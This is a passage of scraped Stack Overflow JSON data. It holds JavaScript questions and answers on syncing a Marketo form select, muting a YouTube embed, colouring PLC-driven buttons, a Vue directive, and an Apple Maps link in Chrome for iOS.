"$(document).on(&#39;change&#39;,&#39;[name=&quot;contact_iminterestedin&quot;]&#39;,fu&zwnj;&#8203;nction() {  });   apperantly there were double quotes in it"}, {"owner": {"reputation": 199, "user_id": 2758089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8f75c8085da81d3799b1a1291162a1f?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno Gomes", "link": "https://stackoverflow.com/users/2758089/bruno-gomes"}, "reply_to_user": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558560587, "post_id": 56264738, "comment_id": 99146873, "body": "@RinorDreshaj i was getting syntax erroes but i tried:   <code>$(document).on(&#39;change&#39;,&#39;name=&quot;contact_iminterestedin&quot;]&#39;,fun&zwnj;&#8203;ction(){     const selected = $(this).val();     const matchValue = $(`#Initial_Product_Requested__c option[value=&quot;${  selected  }&quot;]`);     matchValue.prop(&#39;selected&#39;, true); }); </code> and that didnt work and also made it so the selected field did not change like it was doing before. the new piece you updated still throws parsing errors. It makes the <code>#Initial_Product_Requested__c</code> not green anymore in the linter and it&#39;s yellow now and says Unexpected character &#39;#&#39;"}, {"owner": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "edited": false, "score": 0, "creation_date": 1558563125, "post_id": 56264738, "comment_id": 99147587, "body": "<a href=\"https://codepen.io/anon/pen/mYpobb?editors=1010\" rel=\"nofollow noreferrer\">codepen.io/anon/pen/mYpobb?editors=1010</a> try this, there is an explanation I did on the code"}], "answers": [{"comments": [{"owner": {"reputation": 199, "user_id": 2758089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8f75c8085da81d3799b1a1291162a1f?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno Gomes", "link": "https://stackoverflow.com/users/2758089/bruno-gomes"}, "edited": false, "score": 0, "creation_date": 1558561340, "post_id": 56265290, "comment_id": 99147112, "body": "No luck.  Here i put a codepenn together if you wanna take a look: <a href=\"https://codepen.io/bruno-gomes/pen/YbYBER?editors=1100\" rel=\"nofollow noreferrer\">codepen.io/bruno-gomes/pen/YbYBER?editors=1100</a>  if you change the &lt;select&gt; option on the left it will change the right to match. However, in my marketo form, selecting an option will spawn new &lt;select&gt; elements, and while the option inside the select changes, it does not trigger the new &lt;select&gt; to spawn."}, {"owner": {"reputation": 199, "user_id": 2758089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8f75c8085da81d3799b1a1291162a1f?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno Gomes", "link": "https://stackoverflow.com/users/2758089/bruno-gomes"}, "edited": false, "score": 1, "creation_date": 1558616220, "post_id": 56265290, "comment_id": 99165876, "body": "So I tried the code in your penn, and it still has the exact same problem. The selected option populates the marketo form select, but it does not trigger the event that is supposed to come after (an extra &lt;select&gt; element being injected into the HTML). I&#39;m trying to get an exact duplicate of the Marketo form I&#39;m using and will follow up with that so you can see it for yourself. @Rinor Dreshaj"}], "tags": [], "owner": {"reputation": 894, "user_id": 4898843, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0P2vt.png?s=128&g=1", "display_name": "Rinor Dreshaj", "link": "https://stackoverflow.com/users/4898843/rinor-dreshaj"}, "is_accepted": false, "score": 0, "last_activity_date": 1558560714, "creation_date": 1558560714, "answer_id": 56265290, "question_id": 56264738, "link": "https://stackoverflow.com/questions/56264738/using-jquery-and-an-html5-form-to-populate-the-select-field-on-a-marketo-web-for/56265290#56265290", "title": "Using jQuery and an HTML5 form to populate the select field on a Marketo web form", "body": "<pre><code>    $(document).on('change', '[name=\"contact_iminterestedin\"]').on('change', function() {\n        const selected = $(this).val();\n        const matchValue = $(`#Initial_Product_Requested__c option[value=\"${  selected  }\"]`);\n        matchValue.prop('selected', true);\n    });\n</code></pre>\n\n<p>that code should be registering the even handler on the document</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 7506202, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/abf9808f8106d23f638f01598fc72305?s=128&d=identicon&r=PG&f=1", "display_name": "oleeksandr", "link": "https://stackoverflow.com/users/7506202/oleeksandr"}, "is_accepted": false, "score": 1, "last_activity_date": 1613586131, "creation_date": 1613586131, "answer_id": 66247792, "question_id": 56264738, "link": "https://stackoverflow.com/questions/56264738/using-jquery-and-an-html5-form-to-populate-the-select-field-on-a-marketo-web-for/66247792#66247792", "title": "Using jQuery and an HTML5 form to populate the select field on a Marketo web form", "body": "<p>To fire that out you need to add one more line with the: <br> <code>document.querySelector('#target').dispatchEvent(new Event('change'));</code></p>\n<p>NOTE: Triggering event as a jQuery .trigger('change') not working in that case.</p>\n<p>Based on your code it will look like:</p>\n<pre><code>$('[name=&quot;contact_iminterestedin&quot;]').on('change', function() {\n    const selected = $(this).val();\n    const matchValue = $(`#Initial_Product_Requested__c option[value=&quot;${  selected  }&quot;]`);\n    matchValue.prop('selected', true);\n    document.querySelector('#Initial_Product_Requested__c').dispatchEvent(new Event('change'));\n});\n</code></pre>\n<hr />\n<p>Please note that it can be improved with the data attribute, since you have duplicates\nin the code with the only change in #target selector.<br>\nAlso using <code>$(document).on('change', '#source', function(){...});</code> will help if the #source element will be added to the DOM after the event listener initialization.</p>\n"}, {"tags": [], "owner": {"reputation": 2365, "user_id": 6682929, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/BuvWA.jpg?s=128&g=1", "display_name": "Jonathan Portorreal", "link": "https://stackoverflow.com/users/6682929/jonathan-portorreal"}, "is_accepted": false, "score": 0, "last_activity_date": 1614453371, "last_edit_date": 1614453371, "creation_date": 1614453024, "answer_id": 66402489, "question_id": 56264738, "link": "https://stackoverflow.com/questions/56264738/using-jquery-and-an-html5-form-to-populate-the-select-field-on-a-marketo-web-for/66402489#66402489", "title": "Using jQuery and an HTML5 form to populate the select field on a Marketo web form", "body": "<p>Use <a href=\"https://developers.marketo.com/javascript-api/forms/api-reference/\" rel=\"nofollow noreferrer\">marketo's api</a> to update the form. You will need the form's <code>id</code> to get the form and then from there you can use <code>setValues</code> when the html field is updated to set the marketo form's dropdown value. This will ensure everything works as expected.</p>\n<pre><code>  $('[name=&quot;contact_iminterestedin&quot;]').on('change', function() {\n    const selected = $(this).val();\n    const matchValue = $(`#Initial_Product_Requested__c option[value=&quot;${selected}&quot;]`);\n    matchValue.prop('selected', true);\n    // get the form,\n    const form = MktoForms2.getForm(3578);\n    // set the form value you are interested in updating\n    form.setValues({\n      Initial_Product_Requested__c: selected,\n    });\n  });\n</code></pre>\n<p>Here's a <a href=\"https://codepen.io/hitscottys/pen/PobRZqx?editors=0001\" rel=\"nofollow noreferrer\">codepen</a> for you.</p>\n"}], "owner": {"reputation": 199, "user_id": 2758089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8f75c8085da81d3799b1a1291162a1f?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno Gomes", "link": "https://stackoverflow.com/users/2758089/bruno-gomes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 108, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1614453371, "creation_date": 1558557827, "last_edit_date": 1558620831, "question_id": 56264738, "link": "https://stackoverflow.com/questions/56264738/using-jquery-and-an-html5-form-to-populate-the-select-field-on-a-marketo-web-for", "title": "Using jQuery and an HTML5 form to populate the select field on a Marketo web form", "body": "<p>Edit: Added a CodePenn to include a working example.</p>\n\n<p>I'm taking a select choice from an HTML5 form and populating a Marketo Web form with its match.</p>\n\n<p>Using some jQuery to get the value on the  html element and match it with the marketo form . Once I choose the option on form A, it selects the option on form B</p>\n\n<p>Form A = regular HTML5 form </p>\n\n<p>Form B = Marketo web form</p>\n\n<p>The Marketo form has extra fields that are not in the HTML until you select an option. Once you pick an option, it will inject other fields into the form. If I select the option value manually, it works fine, but when the script adds the value to the Marketo form, it does not fire/trigger the same way.</p>\n\n<p>Regular HTML5 Form markup:</p>\n\n<pre><code>&lt;form&gt;\n&lt;div class=\"form-group\"&gt;\n  &lt;p&gt;&lt;strong&gt;I AM INTERESTED IN:&lt;/strong&gt;&lt;/p&gt;\n  &lt;select id=\"select-iminterestedin\" name=\"contact_iminterestedin\" class=\"form-control\"&gt;\n    &lt;option value=\"\"&gt;Select...&lt;/option&gt;\n    &lt;option value=\"option1\"&gt;option1&lt;/option&gt;\n    &lt;option value=\"option2\"&gt;option2&lt;/option&gt;\n    &lt;option value=\"option3\"&gt;option3&lt;/option&gt;\n  &lt;/select&gt;\n&lt;/div&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>Matching the  option value on the second form:</p>\n\n<pre><code>  // populate the select field\n\n  $('[name=\"contact_iminterestedin\"]').on('change', function() {\n    const selected = $(this).val();\n    const matchValue = $(`#Initial_Product_Requested__c option[value=\"${  selected  }\"]`);\n    matchValue.prop('selected', true);\n  });\n</code></pre>\n\n<p>CodePenn demo of the entire thing:</p>\n\n<p><strong><a href=\"https://codepen.io/bruno-gomes/pen/YbYBER?editors=0010\" rel=\"nofollow noreferrer\">https://codepen.io/bruno-gomes/pen/YbYBER?editors=0010</a></strong></p>\n\n<p>So once I select the field on the HTML5 form it adds the selected option to the Marketo form. However this does not trigger the additional field that would show up in the marketo form. But if I select the field on the marketo form manually, this new field shows up.</p>\n\n<p>I would like to know/understand if the method im using specifically does not work how I would expect, or if there is a different approach maybe missing something related to .trigger('change') or .click('change')..</p>\n\n<p>Unfortunately I'm unable to provide the HTML for the Marketo form. It gets loaded into the site via marketo API.</p>\n\n<p>Any tips or help is very much appreciated!\nKind regards.</p>\n"}, {"tags": ["javascript", "html", "css", "video"], "comments": [{"owner": {"reputation": 9199, "user_id": 4786421, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/10204307962041767/picture?type=large", "display_name": "Adam Buchanan Smith", "link": "https://stackoverflow.com/users/4786421/adam-buchanan-smith"}, "edited": false, "score": 0, "creation_date": 1558558161, "post_id": 56264718, "comment_id": 99145945, "body": "You cannot do that in css or javascript, an iframe is on their server."}, {"owner": {"reputation": 41497, "user_id": 661872, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yqbSi.png?s=128&g=1", "display_name": "Lawrence Cherone", "link": "https://stackoverflow.com/users/661872/lawrence-cherone"}, "edited": false, "score": 1, "creation_date": 1558558853, "post_id": 56264718, "comment_id": 99146211, "body": "You can use the iframe API for what your doing with muting <a href=\"https://developers.google.com/youtube/iframe_api_reference\" rel=\"nofollow noreferrer\">developers.google.com/youtube/iframe_api_reference</a> and to fix pointer events just place a div over the top and fiddle z-index&#39;s"}, {"owner": {"reputation": 107, "user_id": 11412930, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GG7XnhWtfxE/AAAAAAAAAAI/AAAAAAAAANU/Owbf3Sl92yI/photo.jpg?sz=128", "display_name": "Infamoose", "link": "https://stackoverflow.com/users/11412930/infamoose"}, "reply_to_user": {"reputation": 41497, "user_id": 661872, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yqbSi.png?s=128&g=1", "display_name": "Lawrence Cherone", "link": "https://stackoverflow.com/users/661872/lawrence-cherone"}, "edited": false, "score": 0, "creation_date": 1558559588, "post_id": 56264718, "comment_id": 99146522, "body": "@LawrenceCherone Oh wow, had no idea all this was available. Could you maybe give me an example of how it would look? Does it use a similar function for keypresses etc"}, {"owner": {"reputation": 107, "user_id": 11412930, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GG7XnhWtfxE/AAAAAAAAAAI/AAAAAAAAANU/Owbf3Sl92yI/photo.jpg?sz=128", "display_name": "Infamoose", "link": "https://stackoverflow.com/users/11412930/infamoose"}, "edited": false, "score": 0, "creation_date": 1558559671, "post_id": 56264718, "comment_id": 99146561, "body": "<code>function onKeyDown(event) {             \tswitch (event.keyCode) {                 \tcase 32: &#47;&#47;SpaceBar                                         \tif (muted) {                         \tplayer.unmute() = false                         \tmuted = true;                     \t} else {                         \tplayer.mute():Void                         \tmuted = false;                     \t}                     \tbreak;</code>"}, {"owner": {"reputation": 107, "user_id": 11412930, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GG7XnhWtfxE/AAAAAAAAAAI/AAAAAAAAANU/Owbf3Sl92yI/photo.jpg?sz=128", "display_name": "Infamoose", "link": "https://stackoverflow.com/users/11412930/infamoose"}, "edited": false, "score": 0, "creation_date": 1558559809, "post_id": 56264718, "comment_id": 99146615, "body": "I&#39;m not massively educated on JS so i&#39;m just spitballing here from various code i&#39;ve found online"}, {"owner": {"reputation": 107, "user_id": 11412930, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GG7XnhWtfxE/AAAAAAAAAAI/AAAAAAAAANU/Owbf3Sl92yI/photo.jpg?sz=128", "display_name": "Infamoose", "link": "https://stackoverflow.com/users/11412930/infamoose"}, "edited": false, "score": 0, "creation_date": 1558591349, "post_id": 56264718, "comment_id": 99153014, "body": "Still haven&#39;t been able to get it working, just not sure where to start with youtubes iframe api"}, {"owner": {"reputation": 1029, "user_id": 8729103, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/fbd4857a5525dc8930a313b7035a639b?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/8729103/harry"}, "edited": false, "score": 0, "creation_date": 1558703371, "post_id": 56264718, "comment_id": 99199053, "body": "There is an example of how it looks like on the linked iframe_api_reference page, just copy the topmost html code play with it. here some quick and dirty fiddle for you with a copy of the linked stuff plus catching the space key. <a href=\"https://jsfiddle.net/7mLx2h0z/1/\" rel=\"nofollow noreferrer\">jsfiddle.net/7mLx2h0z/1</a> note that when the focus is on the video, the space key event is not forwarded to your code, the player will pause instead of mute"}], "owner": {"reputation": 107, "user_id": 11412930, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GG7XnhWtfxE/AAAAAAAAAAI/AAAAAAAAANU/Owbf3Sl92yI/photo.jpg?sz=128", "display_name": "Infamoose", "link": "https://stackoverflow.com/users/11412930/infamoose"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558557733, "creation_date": 1558557733, "question_id": 56264718, "link": "https://stackoverflow.com/questions/56264718/can-you-convert-the-video-part-of-this-code-into-a-youtube-iframe-embed", "title": "Can you convert the &lt;video&gt; part of this code into a youtube iframe embed", "body": "<p>I have this piece of code that I'm using for an intro video and it all works perfectly alongside my progress bars for loading, however, I've just realised the client I'm putting it into can't use mp4 files. I've uploaded the video to youtube and would like to just use an youtube  embed instead of the local source.</p>\n\n<pre><code>&lt;video class=\"introVideo\" id=\"introVideo\" width=\"1920\" height=\"1080\" autoplay muted&gt;\n  &lt;source src=\"video.mp4\" type=\"video/mp4\"&gt;\n&lt;/video&gt;\n&lt;script&gt;\nwindow.onload = function(){\n  var myVideo = document.getElementById(\"introVideo\");\n\n  document.onkeydown = function(event) {\n    switch (event.keyCode) {\n      case 32: //SpaceBar\n        myVideo.muted = !myVideo.muted;\n      break;\n    }\n    return false;\n  }\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>I used my incredibly basic knowledge to attempt this but I'm pretty sure I'm just practising wishful thinking and it won't work like this.</p>\n\n<pre><code>&lt;iframe class=\"introVideo\" id=\"introVideo\" type=\"text/html\" width=\"100%\" height=\"100%\" src=\"https://www.youtube.com/embed/2x18zIJb-YY?autoplay=1&amp;mute=1&amp;%3Fvq=hd1080&amp;;controls=0;&amp;amp;showinfo=0\" frameborder=\"0\" allow=\"autoplay\" allowfullscreen=\"\";&gt;&lt;/iframe&gt;\n&lt;/video&gt;\n&lt;script&gt;\nwindow.onload = function(){\n  var myVideo = document.getElementById(\"introVideo\");\n\n  document.onkeydown = function(event) {\n    switch (event.keyCode) {\n      case 32: //SpaceBar\n        myVideo.muted = !myVideo.muted;\n      break;\n    }\n    return false;\n  }\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>Forgot to put exactly what I want from this. I essentially just want a youtube embedded video with no pointer-events (done in css) so it cant be played/paused/fullscreened or anything, but then I also want people to have the option of muting the video's audio with \"spacebar\" when they're loading into the game.</p>\n"}, {"tags": ["javascript", "getelementbyid", "plc", "s7-1200"], "comments": [{"owner": {"reputation": 8450, "user_id": 3462319, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/89268869f7b0ba2846aecad61a51b458?s=128&d=identicon&r=PG&f=1", "display_name": "depperm", "link": "https://stackoverflow.com/users/3462319/depperm"}, "edited": false, "score": 1, "creation_date": 1558557878, "post_id": 56264704, "comment_id": 99145833, "body": "this doesn&#39;t work, can you provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> of it working"}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "edited": false, "score": 0, "creation_date": 1558558098, "post_id": 56264704, "comment_id": 99145925, "body": "I assume the tag is different for each button? Where do you make the connection from the button to the specific tag?"}, {"owner": {"reputation": 11, "user_id": 11541548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66a34473335395784f63d52c5fcbabc?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/11541548/simon"}, "edited": false, "score": 0, "creation_date": 1558558801, "post_id": 56264704, "comment_id": 99146191, "body": "the site is running on the PLC so the tag name is a tag in the PLC and no further connection is necessary"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 11541548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66a34473335395784f63d52c5fcbabc?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/11541548/simon"}, "edited": false, "score": 0, "creation_date": 1558559438, "post_id": 56264892, "comment_id": 99146461, "body": "thanks that could work, but that would require a lot of extra programming in the PLC because one button have a tag like \u2018\u201cother_DB\u201d.sometage\u2019 an another have a tag like \u2018\u201csome_DB\u201d.tag\u2019 etc."}, {"owner": {"reputation": 2291, "user_id": 4123400, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-DkZUCAlILYY/AAAAAAAAAAI/AAAAAAAAAD8/Mtl8aEqkn0Q/photo.jpg?sz=128", "display_name": "Rocky Sims", "link": "https://stackoverflow.com/users/4123400/rocky-sims"}, "reply_to_user": {"reputation": 11, "user_id": 11541548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66a34473335395784f63d52c5fcbabc?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/11541548/simon"}, "edited": false, "score": 0, "creation_date": 1558559689, "post_id": 56264892, "comment_id": 99146572, "body": "Ok, I&#39;ve updated my answer for manual entry of tags. Perhaps this will work for you?"}, {"owner": {"reputation": 11, "user_id": 11541548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66a34473335395784f63d52c5fcbabc?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/11541548/simon"}, "edited": false, "score": 0, "creation_date": 1558560526, "post_id": 56264892, "comment_id": 99146846, "body": "Exactly what I wanted, works perfectly. Thank you very much!"}], "tags": [], "owner": {"reputation": 2291, "user_id": 4123400, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-DkZUCAlILYY/AAAAAAAAAAI/AAAAAAAAAD8/Mtl8aEqkn0Q/photo.jpg?sz=128", "display_name": "Rocky Sims", "link": "https://stackoverflow.com/users/4123400/rocky-sims"}, "is_accepted": false, "score": 0, "last_activity_date": 1558559645, "last_edit_date": 1558559645, "creation_date": 1558558542, "answer_id": 56264892, "question_id": 56264704, "link": "https://stackoverflow.com/questions/56264704/reuse-a-javascript-code-for-multiple-buttons/56264892#56264892", "title": "&quot;reuse&quot; a JavaScript code for multiple buttons", "body": "<p>It's hard to be sure since you haven't posted all your code and what you have posted doesn't actually work but I think you're looking for something like this.</p>\n\n<pre><code>const tags = [\n    ':=\"web_DB\".outtag1:',\n    ':=\"web_DB\".outtag2:',\n    //...\n    ':=\"web_DB\".outtag10:'\n];\nwindow.onload = function() {\n    for (let i = 0; i &lt;= 9; i++) {\n        const color = (tags[i] == 1) ? 'green' : 'red';\n        document.getElementById('button' + (i+1)).style.backgroundColor = color;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 11541548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66a34473335395784f63d52c5fcbabc?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/11541548/simon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 73, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1558559645, "creation_date": 1558557668, "question_id": 56264704, "link": "https://stackoverflow.com/questions/56264704/reuse-a-javascript-code-for-multiple-buttons", "title": "&quot;reuse&quot; a JavaScript code for multiple buttons", "body": "<p>I am fairly new to JavaScript,\nI have ben working on a simple if else script to change the color of at button, depending on the status of a variable that I get from a plc (Siemens S7-1200).</p>\n\n<p>The script is working fine and the color of the button is changing.\nBut I have 10 buttons that I want to run this script on.</p>\n\n<p>Is it possible to \u201creuse\u201d the script so that I don\u2019t have to copy the script and change the variables for every button</p>\n\n<p>T</p>\n\n<pre><code>&lt;script&gt;\nvar tag = ':=\"web_DB\".outtag1:'\nvar button = \"button1\"\nwindow.onload = function() {\nif (tag == 1) {\n    document.getElementById(button).style.backgroundColor = 'green';\n} else{\n    document.getElementById(button).style.backgroundColor = 'red';\n}\n\n}\n    &lt;/script&gt;\n\n    &lt;form&gt;\n&lt;input type=\"submit\" id=\"button1\" value=\"button\"&gt;\n&lt;input type=\"hidden\" name='\"web_DB\".intag1' value =\"1\"&gt;\n&lt;/form&gt;\n</code></pre>\n"}, {"tags": ["javascript", "vuejs2", "components", "directive"], "comments": [{"owner": {"reputation": 2727, "user_id": 9266540, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2821f32308af9261e10fdcc522490874?s=128&d=identicon&r=PG&f=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/9266540/michael"}, "edited": false, "score": 0, "creation_date": 1558583291, "post_id": 56264700, "comment_id": 99151269, "body": "Why don&#39;t you put it inside the <code>Button</code> component where the button is? you cannot treat a custom component as a native one."}, {"owner": {"reputation": 803, "user_id": 3914724, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/acI2R.jpg?s=128&g=1", "display_name": "legomolina", "link": "https://stackoverflow.com/users/3914724/legomolina"}, "reply_to_user": {"reputation": 2727, "user_id": 9266540, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2821f32308af9261e10fdcc522490874?s=128&d=identicon&r=PG&f=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/9266540/michael"}, "edited": false, "score": 0, "creation_date": 1558595306, "post_id": 56264700, "comment_id": 99154485, "body": "I called component AppButton to prevent mixing with html element. I want directive be only available to AppButton component, but use it in all components."}], "owner": {"reputation": 803, "user_id": 3914724, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/acI2R.jpg?s=128&g=1", "display_name": "legomolina", "link": "https://stackoverflow.com/users/3914724/legomolina"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 83, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558565879, "creation_date": 1558557640, "last_edit_date": 1558565879, "question_id": 56264700, "link": "https://stackoverflow.com/questions/56264700/define-directive-in-child-component-and-call-it-in-parent-component-vuejs", "title": "Define directive in child component and call it in parent component Vuejs", "body": "<p>I have a custom Button component with custom <code>style</code> directive (v-style) to add some classes:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>directives: {\n        style: {\n            bind(el, binding) {\n                const style = binding.value;\n\n                if (![\"primary\", \"success\", \"error\"].includes(style)) {\n                    throw new TypeError(`Button style ${style} not valid`);\n                }\n\n                el.classList.add(`button-${style}`);\n            }\n        }\n    }\n</code></pre>\n\n<p>And in the parent component I want to use that directive this way:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;template&gt;\n    &lt;div&gt;\n        &lt;Button v-style=\"'primary'\"&gt;Send&lt;/Button&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n</code></pre>\n\n<p>But it's not working. Should I create a global directive and check for the element is bound or there is a better way?</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>Vue.directive(\"style\", {...});\n</code></pre>\n"}, {"tags": ["javascript", "google-maps"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 11401925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcb1782dd27931adb0c87b2ad9800f34?s=128&d=identicon&r=PG", "display_name": "Nick", "link": "https://stackoverflow.com/users/11401925/nick"}, "edited": false, "score": 0, "creation_date": 1558558386, "post_id": 56264843, "comment_id": 99146038, "body": "Your else block is fine, Google and Android users will be able to use that."}, {"owner": {"reputation": 1290, "user_id": 2086597, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/ntMI9.png?s=128&g=1", "display_name": "Mario Parra", "link": "https://stackoverflow.com/users/2086597/mario-parra"}, "edited": false, "score": 0, "creation_date": 1558558406, "post_id": 56264843, "comment_id": 99146047, "body": "I tried with maps:// before using http://. I switched because <a href=\"https://developer.apple.com/library/archive/featuredarticles/iPhoneURLScheme_Reference/MapLinks/MapLinks.html\" rel=\"nofollow noreferrer\">Apple&#39;s docs</a> use http:// instead of maps://. As I mentioned, the current link works fine in Safari, just not Chrome on iOS"}, {"owner": {"reputation": 1290, "user_id": 2086597, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/ntMI9.png?s=128&g=1", "display_name": "Mario Parra", "link": "https://stackoverflow.com/users/2086597/mario-parra"}, "edited": false, "score": 0, "creation_date": 1558561158, "post_id": 56264843, "comment_id": 99147053, "body": "Yes. Looks like it&#39;s a security issue in Chrome for iOS. I re-worked the function and set the variable URL as a <code>href</code> without <code>target=&quot;_blank&quot;</code>, which works"}], "tags": [], "owner": {"reputation": 23, "user_id": 11401925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcb1782dd27931adb0c87b2ad9800f34?s=128&d=identicon&r=PG", "display_name": "Nick", "link": "https://stackoverflow.com/users/11401925/nick"}, "is_accepted": false, "score": 0, "last_activity_date": 1558558279, "creation_date": 1558558279, "answer_id": 56264843, "question_id": 56264671, "link": "https://stackoverflow.com/questions/56264671/apple-maps-link-not-opening-native-app-through-chrome-for-ios/56264843#56264843", "title": "Apple Maps link not opening native app through Chrome for iOS", "body": "<p>They key is iOS users use a different protocol at the beginning. Try changing the \"http://\" in the iOS block to \"maps://\" and see if that works. </p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 9554860, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LpRtC.jpg?s=128&g=1", "display_name": "Blessen Mathew", "link": "https://stackoverflow.com/users/9554860/blessen-mathew"}, "is_accepted": false, "score": 0, "last_activity_date": 1579639529, "creation_date": 1579639529, "answer_id": 59848969, "question_id": 56264671, "link": "https://stackoverflow.com/questions/56264671/apple-maps-link-not-opening-native-app-through-chrome-for-ios/59848969#59848969", "title": "Apple Maps link not opening native app through Chrome for iOS", "body": "<p>Change the </p>\n\n<pre><code>www.google.com/maps/...\n</code></pre>\n\n<p>to </p>\n\n<pre><code>maps.google.com/maps/...\n</code></pre>\n"}], "owner": {"reputation": 1290, "user_id": 2086597, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/ntMI9.png?s=128&g=1", "display_name": "Mario Parra", "link": "https://stackoverflow.com/users/2086597/mario-parra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 650, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1579639529, "creation_date": 1558557511, "question_id": 56264671, "link": "https://stackoverflow.com/questions/56264671/apple-maps-link-not-opening-native-app-through-chrome-for-ios", "title": "Apple Maps link not opening native app through Chrome for iOS", "body": "<p>I've built a custom Google map that includes a function that either sets a link to open in Apple Maps or Google Maps:</p>\n\n<pre><code>function mapsSelector(lat, long) {\n  /* If on iOS, open in Apple Maps */\n  if ((navigator.platform.indexOf('iPhone') != -1) || (navigator.platform.indexOf('iPad') != -1)) {\n    window.open('http://maps.apple.com/?daddr=' + lat + ',' + long + '&amp;dirflg=w');\n  /* else, use Google */\n  } else {\n    window.open('https://www.google.com/maps/dir/?api=1&amp;destination=' + lat + ',' + long + '&amp;travelmode=bicycling');\n  }\n}\n</code></pre>\n\n<p>It works on my website when it's run as a web app or in Safari (it opens Apple Maps), but in Chrome for iOS, it briefly opens a new tab, which then immediately closes. If the same URL is opened as a standard <code>href</code>, it works as expected, so I imagine it's something to do with the way the function triggers the link.</p>\n\n<p>To reproduce, you can go to <a href=\"http://nyceboarding.com/map.html\" rel=\"nofollow noreferrer\">http://nyceboarding.com/map.html</a>, tap on any marker, and then the \"Get Directions\" link.</p>\n"}, {"tags": ["javascript", "logging", 